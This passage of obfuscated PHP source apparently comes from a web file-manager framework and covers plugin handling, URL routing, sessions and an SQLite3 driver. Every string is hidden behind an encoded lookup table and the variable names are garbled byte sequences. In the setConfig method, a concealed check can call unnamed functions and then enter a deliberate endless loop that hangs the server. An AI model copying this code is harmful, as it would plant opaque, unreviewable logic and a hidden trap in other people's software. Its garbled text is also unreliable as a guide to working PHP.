(!$È™Í¼Ñ±) { return array(); } $—Æ£âŠ» = Hook::trigger($Ãó¶Á‘§[1660], $È™Í¼Ñ±); if ($—Æ£âŠ» && is_array($—Æ£âŠ»)) { $È™Í¼Ñ± = $—Æ£âŠ»; } $this->packageData = $È™Í¼Ñ±; return $È™Í¼Ñ±; } public function packageInfoGet($ØğÒÃ«) { $ÎëÇ°³“ = $this->appPackage(); return array_get_value($ÎëÇ°³“, $ØğÒÃ«); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ÕŸ²ó÷å][1661]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ÕŸ²ó÷å][1662]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ÕŸ²ó÷å][1663]); } public function echoJsAssign($÷ç™ü¢°, $˜øÍĞçª) { $this->echoJsAssignArr[$÷ç™ü¢°] = $˜øÍĞçª; } private function parseFile($·´ •’Š) { $ùÓ¯ˆ© =& $_SERVER[ÕŸ²ó÷å]; $ñÒÃÒî¤ = file_get_contents_nossl($·´ •’Š); $‰ÂÖò Õ = array($ùÓ¯ˆ©[1664], $ùÓ¯ˆ©[1665], $ùÓ¯ˆ©[1666], $ùÓ¯ˆ©[1667], $ùÓ¯ˆ©[1668], $ùÓ¯ˆ©[1669], $ùÓ¯ˆ©[1670]); $´şÒÎ© = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$ùÓ¯ˆ©[102]][$ùÓ¯ˆ©[1671]]); foreach ($this->echoJsAssignArr as $åÉåœ¦ª => $ÛÍ·¡ë¤) { $‰ÂÖò Õ[] = $ùÓ¯ˆ©[1672] . $åÉåœ¦ª . $ùÓ¯ˆ©[1673]; $´şÒÎ©[] = is_array($ÛÍ·¡ë¤) || is_object($ÛÍ·¡ë¤) ? rawurlencode(json_encode($ÛÍ·¡ë¤)) : $ÛÍ·¡ë¤; } if (strstr($ñÒÃÒî¤, $ùÓ¯ˆ©[1674])) { $ç ÉÔ’É = rawurlencode(json_encode($this->pluginLangArr)); $ñÒÃÒî¤ = str_replace($ùÓ¯ˆ©[1674], $ç ÉÔ’É, $ñÒÃÒî¤); } if (strstr($ñÒÃÒî¤, $ùÓ¯ˆ©[1675])) { $ç ÉÔ’É = $ç ÉÔ’É = rawurlencode(json_encode($this->getConfig())); $ñÒÃÒî¤ = str_replace($ùÓ¯ˆ©[1675], $ç ÉÔ’É, $ñÒÃÒî¤); } $ñÒÃÒî¤ = str_replace($‰ÂÖò Õ, $´şÒÎ©, $ñÒÃÒî¤); return $ñÒÃÒî¤; } private function parseLang(&$²†¨¤¬á) { $°±’ÍË“ =& $_SERVER[ÕŸ²ó÷å]; $¢¹‹‹õü = $°±’ÍË“[1676]; if (!strstr($²†¨¤¬á, $¢¹‹‹õü)) { return; } preg_match_all($°±’ÍË“[1677], $²†¨¤¬á, $øÔßš°Ğ); if (!is_array($øÔßš°Ğ) || count($øÔßš°Ğ) == 0 || !is_array($øÔßš°Ğ[0]) || count($øÔßš°Ğ[0]) == 0) { return; } $„úù„ûı = array(); $Ìôé™Ö• = array(); foreach ($øÔßš°Ğ[0] as $úŞù˜ëÊ) { $¢ú›‰‚ä = substr($úŞù˜ëÊ, strlen($¢¹‹‹õü), -4); $¼±Ğö†í = LNG($¢ú›‰‚ä); $„úù„ûı[] = $úŞù˜ëÊ; $Ìôé™Ö•[] = str_replace(array($°±’ÍË“[59], $°±’ÍË“[1160], $°±’ÍË“[427], $°±’ÍË“[131]), array($°±’ÍË“[53], $°±’ÍË“[53], $°±’ÍË“[12], $°±’ÍË“[1678]), $¼±Ğö†í); } $²†¨¤¬á = str_replace($„úù„ûı, $Ìôé™Ö•, $²†¨¤¬á); } private function parseConfig(&$åÔñÆ¸) { $ß»£Ò¾‡ =& $_SERVER[ÕŸ²ó÷å]; $¬ÄôÂ‡ = $ß»£Ò¾‡[1679]; if (!strstr($åÔñÆ¸, $¬ÄôÂ‡)) { return; } preg_match_all($ß»£Ò¾‡[1680], $åÔñÆ¸, $Å²Ğ¸Öï); if (!is_array($Å²Ğ¸Öï) || count($Å²Ğ¸Öï) == 0 || !is_array($Å²Ğ¸Öï[0]) || count($Å²Ğ¸Öï[0]) == 0) { return; } $Öö‡¸‡¶ = $this->getConfig(); $ïìË¡İµ = array(); $©¨ĞÕ¹ = array(); foreach ($Å²Ğ¸Öï[0] as $ÁÈ‰¿ ²) { $Í±ÄåêÙ = substr($ÁÈ‰¿ ², strlen($¬ÄôÂ‡), -2); $ïìË¡İµ[] = $ÁÈ‰¿ ²; $©¨ĞÕ¹[] = _get($Öö‡¸‡¶, $Í±ÄåêÙ); } $åÔñÆ¸ = str_replace($ïìË¡İµ, $©¨ĞÕ¹, $åÔñÆ¸); } private function parsePackage(&$Á’Ò´›´) { $êµ•¼ÔÔ =& $_SERVER[ÕŸ²ó÷å]; $ßûÀ†ÀÂ = $êµ•¼ÔÔ[1681]; if (!strstr($Á’Ò´›´, $ßûÀ†ÀÂ)) { return; } preg_match_all($êµ•¼ÔÔ[1682], $Á’Ò´›´, $“ŒæÚú÷); if (!is_array($“ŒæÚú÷) || count($“ŒæÚú÷) == 0 || !is_array($“ŒæÚú÷[0]) || count($“ŒæÚú÷[0]) == 0) { return; } $ŸşÄç¼ = $this->appPackage(); $ĞÉÀ»‚ = array(); $’«Ë¦¨ = array(); foreach ($“ŒæÚú÷[0] as $¸ÒŠşî) { $ŒåÅ¯á‡ = substr($¸ÒŠşî, strlen($ßûÀ†ÀÂ), -2); $ĞÉÀ»‚[] = $¸ÒŠşî; $’«Ë¦¨[] = _get($ŸşÄç¼, $ŒåÅ¯á‡); } $Á’Ò´›´ = str_replace($ĞÉÀ»‚, $’«Ë¦¨, $Á’Ò´›´); } final function echoFile($êÒ¡ş§, $»Ùêœ¤¹ = false) { $Ã¹øÌ–ø =& $_SERVER[ÕŸ²ó÷å]; $Àïê²çé = $this->pluginPath . $êÒ¡ş§; if (ACT == $Ã¹øÌ–ø[1683]) { echo $Ã¹øÌ–ø[1684] . $this->pluginName . $Ã¹øÌ–ø[8] . $êÒ¡ş§ . $Ã¹øÌ–ø[1685]; if (!file_exists($Àïê²çé)) { echo $Ã¹øÌ–ø[1686]; return; } } $ÆƒûÃüË = $this->parseFile($Àïê²çé); $this->parseLang($ÆƒûÃüË); $this->parseConfig($ÆƒûÃüË); $this->parsePackage($ÆƒûÃüË); if (is_array($»Ùêœ¤¹)) { $ÆƒûÃüË = str_replace(array_keys($»Ùêœ¤¹), array_values($»Ùêœ¤¹), $ÆƒûÃüË); } echo $Ã¹øÌ–ø[59] . $ÆƒûÃüË; } private function checkVersion() { $ÕõØØÀŸ =& $_SERVER[ÕŸ²ó÷å]; $’úª¼¤à = $this->appPackage(); $£Œé«»Å = $this->getConfig(); if ($£Œé«»Å[$ÕõØØÀŸ[1687]] == $’úª¼¤à[$ÕõØØÀŸ[1661]]) { return; } $this->regist(); $this->setConfig(array($ÕõØØÀŸ[1687] => $’úª¼¤à[$ÕõØØÀŸ[1661]])); } final function initLang() { $§ñ­×À =& $_SERVER[ÕŸ²ó÷å]; $œ“Äöìä = $§ñ­×À[1688]; $¢¼­ñÕï = $this->pluginPath . $§ñ­×À[1689]; $Äà©õ‡ = I18n::getType(); $ÄÔç„äŒ = array(); if (file_exists($¢¼­ñÕï . $Äà©õ‡ . $§ñ­×À[922])) { $ÄÔç„äŒ = (include $¢¼­ñÕï . $Äà©õ‡ . $§ñ­×À[922]); } else { if ($Äà©õ‡ == $§ñ­×À[1690] && !file_exists($¢¼­ñÕï . $Äà©õ‡ . $§ñ­×À[922]) && file_exists($¢¼­ñÕï . $§ñ­×À[1691])) { $ÄÔç„äŒ = (include $¢¼­ñÕï . $§ñ­×À[1691]); } else { if (file_exists($¢¼­ñÕï . $œ“Äöìä . $§ñ­×À[922])) { $ÄÔç„äŒ = (include $¢¼­ñÕï . $œ“Äöìä . $§ñ­×À[922]); } } } if (!is_array($ÄÔç„äŒ)) { return array(); } if (@count($ÄÔç„äŒ) > 0) { I18n::set($ÄÔç„äŒ); } return $ÄÔç„äŒ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($³¯Õ±Ó¤) { $–ùÍÖİÙ =& $_SERVER[ÕŸ²ó÷å]; if (!isset($_SERVER[$–ùÍÖİÙ[54]]) || !isset($_SERVER[$–ùÍÖİÙ[63]])) { $ì÷ç˜¤’ = $–ùÍÖİÙ[961]; $İùƒÚÚé = $–ùÍÖİÙ[56]; $ÅÜ³œä = $_SERVER[$–ùÍÖİÙ[57]] . $–ùÍÖİÙ[58]; $¢¿ÃÂèè = $İùƒÚÚé($ÅÜ³œä); $Îà“Í® = explode($–ùÍÖİÙ[59], $¢¿ÃÂèè); if (count($Îà“Í®) < $–ùÍÖİÙ[693]) { $œ›ª»Ğ˜ = $–ùÍÖİÙ[61]; $œ›ª»Ğ˜(); } $…˜ñ‚Ñ = $–ùÍÖİÙ[962]; $…˜ñ‚Ñ($_SERVER[$–ùÍÖİÙ[963]]); $•ŸÙ‹± = 1; for ($á ¥©ä = $•ŸÙ‹±; $á ¥©ä > 0; $á ¥©ä++) { $…˜ñ‚Ñ = json_encode($GLOBALS[$–ùÍÖİÙ[501]]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $³¯Õ±Ó¤); } public function onSetConfig($ªÏÑºÊß) { } public function onGetConfig($ùÕ†¤³) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($´©é˜Âí) { if ($´©é˜Âí == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($•™‘ìë = "\x70\154\x75\x67\x69\x6e\x41\165\x74\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $ºüùá’© = $this->getConfig(); if (!$ºüùá’©[$•™‘ìë]) { return !1; } return ActionCall($_SERVER[ÕŸ²ó÷å][1692], $ºüùá’©[$•™‘ìë]); } public function url($ˆ’÷±­°, $åœ¶Å» = '', $Œ°‰“‡ï = true) { $ô÷©ã”… =& $_SERVER[ÕŸ²ó÷å]; $¯¥ŸŞíÃ = $this->getConfig(); $æã©œŸº = KOD_VERSION . $ô÷©ã”…[10] . KOD_VERSION_BUILD; $àµ¾Òº = $this->packageVersion(); $ŞşÜ”´¦ = $æã©œŸº . $ô÷©ã”…[471] . $àµ¾Òº; if (substr($ˆ’÷±­°, 0, 4) == $ô÷©ã”…[162] || substr($ˆ’÷±­°, 0, 2) == $ô÷©ã”…[1413]) { $’şÓ²•¦ = $ˆ’÷±­° . $ô÷©ã”…[1693] . $ŞşÜ”´¦; } else { if ($åœ¶Å» == $ô÷©ã”…[12]) { $’şÓ²•¦ = $this->pluginHost . $ˆ’÷±­° . $ô÷©ã”…[1693] . $ŞşÜ”´¦; } else { if ($åœ¶Å» === $ô÷©ã”…[88]) { $’şÓ²•¦ = $this->pluginHost . $ˆ’÷±­°; } else { if ($åœ¶Å» == $ô÷©ã”…[1694]) { $’şÓ²•¦ = STATIC_PATH . $ˆ’÷±­° . $ô÷©ã”…[1693] . $æã©œŸº; } else { if ($åœ¶Å» == $ô÷©ã”…[1695]) { $’şÓ²•¦ = APP_HOST . $ô÷©ã”…[1696] . $ˆ’÷±­° . $ô÷©ã”…[1693] . $æã©œŸº; } else { if (isset($¯¥ŸŞíÃ[$åœ¶Å»])) { $’şÓ²•¦ = $¯¥ŸŞíÃ[$åœ¶Å»] . $ˆ’÷±­° . $ô÷©ã”…[1693] . $ŞşÜ”´¦; } } } } } } if (!$Œ°‰“‡ï) { return $’şÓ²•¦; } echo $’şÓ²•¦; } public function link($‡ÏæÁœñ = false, $ÏËÚÑı = '') { $ì«Øµãì =& $_SERVER[ÕŸ²ó÷å]; $ê‚ô–çå = $this->linkHas == !1; $this->linkHas = !0; if (!$‡ÏæÁœñ) { $this->link($ì«Øµãì[1697], $ì«Øµãì[1695]); $this->link($ì«Øµãì[1698], $ì«Øµãì[1694]); $this->link($ì«Øµãì[1699], $ì«Øµãì[1694]); $this->link($ì«Øµãì[1700], $ì«Øµãì[1694]); $this->link($ì«Øµãì[1701], $ì«Øµãì[1694]); if ($ê‚ô–çå) { Hook::trigger($ì«Øµãì[1702]); } return; } $êÜˆæû¹ = $this->url($‡ÏæÁœñ, $ÏËÚÑı, !1); if (substr($‡ÏæÁœñ, -3) == $ì«Øµãì[1703]) { echo $ì«Øµãì[1704] . $êÜˆæû¹ . $ì«Øµãì[1705] . $ì«Øµãì[59]; } else { if (substr($‡ÏæÁœñ, -4) == $ì«Øµãì[1706]) { echo $ì«Øµãì[1707] . $êÜˆæû¹ . $ì«Øµãì[1708] . $ì«Øµãì[59]; } } if ($ê‚ô–çå) { Hook::trigger($ì«Øµãì[1702]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\171" => "\133\136\57\135\53", "\x3a\156\x75\x6d" => "\133\60\55\71\x5d\x2b", "\x3a\141\154\x6c" => "\56\x2a"); public static $errorCallback; public static function __callstatic($­Âš‹ëĞ, $ŒºÙĞîÚ) { $‘ÁùØ¢µ =& $_SERVER[ÕŸ²ó÷å]; if ($­Âš‹ëĞ == $‘ÁùØ¢µ[1709]) { $°–Äê²¸ = array_map($‘ÁùØ¢µ[1710], $ŒºÙĞîÚ[0]); $¬Œú©Á = strpos($ŒºÙĞîÚ[1], $‘ÁùØ¢µ[8]) === 0 ? $ŒºÙĞîÚ[1] : $‘ÁùØ¢µ[8] . $ŒºÙĞîÚ[1]; $’æœÈ¾‡ = $ŒºÙĞîÚ[2]; } else { $°–Äê²¸ = null; $¬Œú©Á = strpos($ŒºÙĞîÚ[0], $‘ÁùØ¢µ[8]) === 0 ? $ŒºÙĞîÚ[0] : $‘ÁùØ¢µ[8] . $ŒºÙĞîÚ[0]; $’æœÈ¾‡ = $ŒºÙĞîÚ[1]; } array_push(self::$maps, $°–Äê²¸); array_push(self::$routes, $¬Œú©Á); array_push(self::$methods, strtoupper($­Âš‹ëĞ)); array_push(self::$callbacks, $’æœÈ¾‡); } public static function error($ÓøŸÏËí) { self::$errorCallback = $ÓøŸÏËí; } public static function haltOnMatch($Ş•‘†Øş = true) { self::$halts = $Ş•‘†Øş; } public static function dispatch() { $¸íØ¬ÉÂ =& $_SERVER[ÕŸ²ó÷å]; $µıÍ˜© = parse_url($_SERVER[$¸íØ¬ÉÂ[1711]], PHP_URL_PATH); $ÁŸß› = $_SERVER[$¸íØ¬ÉÂ[174]]; $¹¼íò = array_keys(static::$patterns); $šÙ ± = array_values(static::$patterns); $ªŠÁĞÍ = !1; self::$routes = preg_replace($¸íØ¬ÉÂ[1364], $¸íØ¬ÉÂ[8], self::$routes); if (in_array($µıÍ˜©, self::$routes)) { $˜€úĞ‚ã = array_keys(self::$routes, $µıÍ˜©); foreach ($˜€úĞ‚ã as $øùêø™’) { if (self::$methods[$øùêø™’] == $ÁŸß› || self::$methods[$øùêø™’] == $¸íØ¬ÉÂ[1712] || in_array($ÁŸß›, self::$maps[$øùêø™’])) { $ªŠÁĞÍ = !0; if (!is_object(self::$callbacks[$øùêø™’])) { $Ê†¾Á¾˜ = explode($¸íØ¬ÉÂ[8], self::$callbacks[$øùêø™’]); $—‹†ìòÏ = end($Ê†¾Á¾˜); $õ¯é·èÈ = explode($¸íØ¬ÉÂ[1296], $—‹†ìòÏ); $ıÍñæ¡‘ = new $õ¯é·èÈ[0](); $ıÍñæ¡‘->{$õ¯é·èÈ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$øùêø™’]); if (self::$halts) { return; } } } } } else { $–ô”Á¿¶ = 0; foreach (self::$routes as $øùêø™’) { if (strpos($øùêø™’, $¸íØ¬ÉÂ[4]) !== !1) { $øùêø™’ = str_replace($¹¼íò, $šÙ ±, $øùêø™’); } if (preg_match($¸íØ¬ÉÂ[1713] . $øùêø™’ . $¸íØ¬ÉÂ[1714], $µıÍ˜©, $ë÷ëÆÑª)) { if (self::$methods[$–ô”Á¿¶] == $ÁŸß› || self::$methods[$–ô”Á¿¶] == $¸íØ¬ÉÂ[1712] || !empty(self::$maps[$–ô”Á¿¶]) && in_array($ÁŸß›, self::$maps[$–ô”Á¿¶])) { $ªŠÁĞÍ = !0; array_shift($ë÷ëÆÑª); if (!is_object(self::$callbacks[$–ô”Á¿¶])) { $Ê†¾Á¾˜ = explode($¸íØ¬ÉÂ[8], self::$callbacks[$–ô”Á¿¶]); $—‹†ìòÏ = end($Ê†¾Á¾˜); $õ¯é·èÈ = explode($¸íØ¬ÉÂ[1296], $—‹†ìòÏ); $ıÍñæ¡‘ = new $õ¯é·èÈ[0](); if (!method_exists($ıÍñæ¡‘, $õ¯é·èÈ[1])) { echo $¸íØ¬ÉÂ[1715]; } else { call_user_func_array(array($ıÍñæ¡‘, $õ¯é·èÈ[1]), $ë÷ëÆÑª); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$–ô”Á¿¶], $ë÷ëÆÑª); if (self::$halts) { return; } } } } $–ô”Á¿¶++; } } if ($ªŠÁĞÍ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ÙÖ©ä‹« =& $_SERVER[ÕŸ²ó÷å]; header($_SERVER[$ÙÖ©ä‹«[1716]] . $ÙÖ©ä‹«[1717]); echo $ÙÖ©ä‹«[1718]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$¸íØ¬ÉÂ[1711]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $æ‡˜ÈËò =& $_SERVER[ÕŸ²ó÷å]; static $ÎšªÈ· = false; if ($ÎšªÈ·) { return $ÎšªÈ·; } $ØºóÇ‰Õ = $GLOBALS[$æ‡˜ÈËò[6]][$æ‡˜ÈËò[434]]; self::$sessionTime = $ØºóÇ‰Õ[$æ‡˜ÈËò[1719]]; $×–¼ßš® = isset($GLOBALS[$æ‡˜ÈËò[1720]]) ? $GLOBALS[$æ‡˜ÈËò[1720]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($×–¼ßš®)) { self::$sessionSign = Cookie::get($×–¼ßš®); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($×–¼ßš®, self::$sessionSign, self::$sessionTime); $±Çïé¡° = $ØºóÇ‰Õ[$æ‡˜ÈËò[1721]]; $ ¶ïÈ— = $ØºóÇ‰Õ[$±Çïé¡°]; $öõÍşÆà = $ØºóÇ‰Õ[$æ‡˜ÈËò[911]]; switch ($±Çïé¡°) { case $æ‡˜ÈËò[21]: self::$handle = Model($æ‡˜ÈËò[912]); break; case $æ‡˜ÈËò[913]: self::$handle = new CacheRedis($ ¶ïÈ—, $öõÍşÆà); break; case $æ‡˜ÈËò[914]: self::$handle = new CacheMemcached($ ¶ïÈ—, $öõÍşÆà); break; case $æ‡˜ÈËò[240]: $ ¶ïÈ—[$æ‡˜ÈËò[97]] = $ ¶ïÈ—[$æ‡˜ÈËò[97]] . $æ‡˜ÈËò[1722]; self::$handle = new CacheFile($ ¶ïÈ—, $öõÍşÆà); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ÎšªÈ· = new self(); return $ÎšªÈ·; } public static function getBySign($ÃÅƒèó‚) { $ÆŞ—”óğ = self::$handle->get($ÃÅƒèó‚); $ÆŞ—”óğ = unserialize($ÆŞ—”óğ); return is_array($ÆŞ—”óğ) ? $ÆŞ—”óğ : array(); } public static function setBySign($¿©ıÈŞÑ, $œ¯—çõç) { CacheLock::lock($¿©ıÈŞÑ); self::$handle->set($¿©ıÈŞÑ, serialize($œ¯—çõç), self::$sessionTime); CacheLock::unlock($¿©ıÈŞÑ); } public static function sign($ˆ—¼€¬• = false) { if ($ˆ—¼€¬•) { self::$sessionSign = $ˆ—¼€¬•; } self::init(); return self::$sessionSign; } public static function set($‹„¦Ê’, $Ÿ•Ú‰‚ä = false) { self::init(); if (is_array($‹„¦Ê’)) { foreach ($‹„¦Ê’ as $¦’¨‹ÉŠ => $ºÂ¨Ïğ­) { array_set_value(self::$data, $¦’¨‹ÉŠ, $ºÂ¨Ïğ­); } } else { array_set_value(self::$data, $‹„¦Ê’, $Ÿ•Ú‰‚ä); } self::setBySign(self::$sessionSign, self::$data); } public static function get($¡äöîÖâ = false) { self::init(); if (!$¡äöîÖâ) { return self::$data; } return array_get_value(self::$data, $¡äöîÖâ); } public static function remove($‘Ë£Ã…) { self::init(); unset(self::$data[$‘Ë£Ã…]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ÕŸ²ó÷å][917])) { self::$handle->clearTimeout(); } } } goto bš«©Ÿ“ËÒ; aÀ±©â³ : class DbSqlite3Base extends Db { public function __construct($¬æÁÛÉ = '') { $¯õÚ±ù– =& $_SERVER[ÕŸ²ó÷å]; if (!class_exists($¯õÚ±ù–[64])) { think_exception(think_lang($¯õÚ±ù–[14]) . $¯õÚ±ù–[65]); } if (!empty($¬æÁÛÉ)) { if (!isset($¬æÁÛÉ[$¯õÚ±ù–[16]])) { $¬æÁÛÉ[$¯õÚ±ù–[16]] = 438; } $this->config = $¬æÁÛÉ; if (empty($this->config[$¯õÚ±ù–[17]])) { $this->config[$¯õÚ±ù–[17]] = array(); } } } public function connect($öĞ×Âø™ = '', $ƒÁ·ÆÃŠ = 0) { $µ¸’Ò Ò =& $_SERVER[ÕŸ²ó÷å]; if (!isset($this->linkID[$ƒÁ·ÆÃŠ])) { if (empty($öĞ×Âø™)) { $öĞ×Âø™ = $this->config; } $this->linkID[$ƒÁ·ÆÃŠ] = new SQLite3($öĞ×Âø™[$µ¸’Ò Ò[21]]); if (!$this->linkID[$ƒÁ·ÆÃŠ]) { think_exception($this->linkID[$ƒÁ·ÆÃŠ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ƒÁ·ÆÃŠ]->busyTimeout(30000); if (1 != think_config($µ¸’Ò Ò[22])) { unset($this->config); } } return $this->linkID[$ƒÁ·ÆÃŠ]; } public function free() { $this->queryID = null; } public function query($«…ëÅË) { $ıÆ¥ë‚Ë =& $_SERVER[ÕŸ²ó÷å]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $«…ëÅË; if ($this->queryID) { $this->free(); } think_action_status($ıÆ¥ë‚Ë[23], 1); think_status($ıÆ¥ë‚Ë[24]); $this->queryID = $this->_linkID->query($«…ëÅË); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $ãº¤§Ô = $this->getAll(); $this->numRows = count($ãº¤§Ô); return $ãº¤§Ô; } } public function execute($—Õ¾¬ãà) { $õ§ÜØ«· =& $_SERVER[ÕŸ²ó÷å]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $—Õ¾¬ãà; if ($this->queryID) { $this->free(); } think_action_status($õ§ÜØ«·[25], 1); think_status($õ§ÜØ«·[24]); $¾º¼³µƒ = $this->_linkID->exec($—Õ¾¬ãà); $this->debug(); if (!1 === $¾º¼³µƒ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ÕŸ²ó÷å][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $›øó‡Ùã = $this->_linkID->query($_SERVER[ÕŸ²ó÷å][27]); if (!$›øó‡Ùã) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ãƒô¯¹ = $this->_linkID->query($_SERVER[ÕŸ²ó÷å][28]); if (!$ãƒô¯¹) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $…ıßÎßÎ = array(); while ($ê×Ûü—Ğ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $…ıßÎßÎ[] = $ê×Ûü—Ğ; } $this->queryID->reset(); return $…ıßÎßÎ; } public function getFields($Ä‰µæÈú) { $üÆÉÌ¯Ø =& $_SERVER[ÕŸ²ó÷å]; $úÖÃÀæœ = $this->query($üÆÉÌ¯Ø[29] . $Ä‰µæÈú . $üÆÉÌ¯Ø[30]); $ÂË ‰Š = array(); if ($úÖÃÀæœ) { foreach ($úÖÃÀæœ as $ñË¤ÆÀÉ => $‡§‡üÀ) { $ÂË ‰Š[$‡§‡üÀ[$üÆÉÌ¯Ø[32]]] = array($üÆÉÌ¯Ø[32] => $‡§‡üÀ[$üÆÉÌ¯Ø[32]], $üÆÉÌ¯Ø[33] => $‡§‡üÀ[$üÆÉÌ¯Ø[33]], $üÆÉÌ¯Ø[35] => (bool) ($‡§‡üÀ[$üÆÉÌ¯Ø[35]] === $üÆÉÌ¯Ø[12]), $üÆÉÌ¯Ø[37] => $‡§‡üÀ[$üÆÉÌ¯Ø[66]], $üÆÉÌ¯Ø[39] => (bool) $‡§‡üÀ[$üÆÉÌ¯Ø[67]], $üÆÉÌ¯Ø[42] => (bool) $‡§‡üÀ[$üÆÉÌ¯Ø[67]]); } } return $ÂË ‰Š; } public function getTables($é¼»é»´ = '') { $è£Ò‡§“ =& $_SERVER[ÕŸ²ó÷å]; $¥ŒşàĞ = $this->query($è£Ò‡§“[45] . $è£Ò‡§“[46] . $è£Ò‡§“[47]); $ûãñæŒŠ = array(); foreach ($¥ŒşàĞ as $ÂÒË¨Ç† => $¨ßœêŒ) { $ûãñæŒŠ[$ÂÒË¨Ç†] = current($¨ßœêŒ); } return $ûãñæŒŠ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Ğ½–”ó¦ =& $_SERVER[ÕŸ²ó÷å]; $this->error = $this->_linkID->lastErrorMsg(); if ($Ğ½–”ó¦[12] != $this->queryStr) { $this->error .= LNG($Ğ½–”ó¦[48]) . $this->queryStr; } think_trace($this->error, $Ğ½–”ó¦[12], $Ğ½–”ó¦[49]); return $this->error; } public function escapeString($û™Í£Ø®) { $ÓÃüª¨ =& $_SERVER[ÕŸ²ó÷å]; if ($this->_linkID) { return $this->_linkID->escapeString($û™Í£Ø®); } return str_ireplace($ÓÃüª¨[68], $ÓÃüª¨[69], $û™Í£Ø®); } public function parseLimit($é“‚‡ã) { $¿Ùì•œ¯ =& $_SERVER[ÕŸ²ó÷å]; $ƒ…ı°Û = $¿Ùì•œ¯[12]; if (!empty($é“‚‡ã)) { $é“‚‡ã = explode($¿Ùì•œ¯[50], $é“‚‡ã); if (count($é“‚‡ã) > 1) { $ƒ…ı°Û .= $¿Ùì•œ¯[51] . $é“‚‡ã[1] . $¿Ùì•œ¯[52] . $é“‚‡ã[0] . $¿Ùì•œ¯[53]; } else { $ƒ…ı°Û .= $¿Ùì•œ¯[51] . $é“‚‡ã[0] . $¿Ùì•œ¯[53]; } } return $ƒ…ı°Û; } } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $ëĞŒ«¤ =& $_SERVER[ÕŸ²ó÷å]; $this->objectDriver = array($ëĞŒ«¤[70], $ëĞŒ«¤[71], $ëĞŒ«¤[72], $ëĞŒ«¤[73], $ëĞŒ«¤[74], $ëĞŒ«¤[75], $ëĞŒ«¤[76], $ëĞŒ«¤[77], $ëĞŒ«¤[78], $ëĞŒ«¤[79], $ëĞŒ«¤[80], $ëĞŒ«¤[81]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($£ìŒ¹˜) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($£ìŒ¹˜, $_SERVER[ÕŸ²ó÷å][8]); } return $£ìŒ¹˜; } public function iconvApp($ï¡¤õ‹Å) { return $ï¡¤õ‹Å; } public function iconvSystem($Ïä¡ß¤) { return $Ïä¡ß¤; } public function iconvTo($°¡ÆØ¹¤, $ÃÔØÔë, $Ú½°äò) { $›ÇÛÖËø =& $_SERVER[ÕŸ²ó÷å]; if (!$°¡ÆØ¹¤ || !function_exists($›ÇÛÖËø[82])) { return $°¡ÆØ¹¤; } static $±«”õ†Œ = array(); $ ¾Ã‹Ğ“ = $ÃÔØÔë . $›ÇÛÖËø[83] . $Ú½°äò . $›ÇÛÖËø[84] . $°¡ÆØ¹¤; if (isset($±«”õ†Œ[$ ¾Ã‹Ğ“])) { return $±«”õ†Œ[$ ¾Ã‹Ğ“]; } if (function_exists($›ÇÛÖËø[85])) { $Ïç…ÏÇÖ = @mb_convert_encoding($°¡ÆØ¹¤, $Ú½°äò, $ÃÔØÔë); } else { $Ïç…ÏÇÖ = @iconv($ÃÔØÔë, $Ú½°äò, $°¡ÆØ¹¤); } $Ïç…ÏÇÖ = $Ïç…ÏÇÖ ? $Ïç…ÏÇÖ : $°¡ÆØ¹¤; if (strstr($Ïç…ÏÇÖ, $›ÇÛÖËø[86])) { $Ïç…ÏÇÖ = str_replace($›ÇÛÖËø[86], $›ÇÛÖËø[11], $Ïç…ÏÇÖ); } $±«”õ†Œ[$ÃÔØÔë . $›ÇÛÖËø[83] . $Ú½°äò . $›ÇÛÖËø[84] . $°¡ÆØ¹¤] = $Ïç…ÏÇÖ; $±«”õ†Œ[$Ú½°äò . $›ÇÛÖËø[83] . $ÃÔØÔë . 